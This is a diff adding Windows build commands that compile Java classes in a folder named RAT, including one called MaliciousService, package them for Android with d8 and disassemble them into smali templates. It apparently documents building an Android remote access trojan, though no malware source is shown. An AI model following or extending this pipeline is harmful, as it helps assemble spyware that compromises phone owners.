@@ -1,0 +1,18 @@
+javac -d C:\Users\keymi\Desktop\RAT\src_java\compiled_classes -cp "C:\Users\keymi\Desktop\RAT\android-14\android.jar;C:\Users\keymi\Desktop\RAT\src_java\..\libs\json-20250517.jar" C:\Users\keymi\Desktop\RAT\src_java\com\example\android\BootReceiver.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\LauncherActivity.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\MaliciousService.java C:\Users\keymi\Desktop\RAT\src_java\com\example\android\PermissionRequestActivity.java
+
+
+
+
+
+cd C:\Users\keymi\Desktop\RAT\src_java\compiled_classes
+jar -cvf compiled_rat_classes.jar -C . com\example\android
+cd C:\Users\keymi\Desktop\RAT\
+
+
+
+
+d8 --output C:\Users\keymi\Desktop\RAT\src_java\dex_output C:\Users\keymi\Desktop\RAT\src_java\compiled_classes\compiled_rat_classes.jar --lib "C:\Users\keymi\Desktop\RAT\android-14\android.jar" --lib "C:\Users\keymi\Desktop\RAT\src_java\..\libs\json-20250517.jar"
+
+
+
+java -jar C:\Tools\baksmali.jar disassemble C:\Users\keymi\Desktop\RAT\src_java\dex_output\classes.dex -o C:\Users\keymi\Desktop\RAT\smali_templates
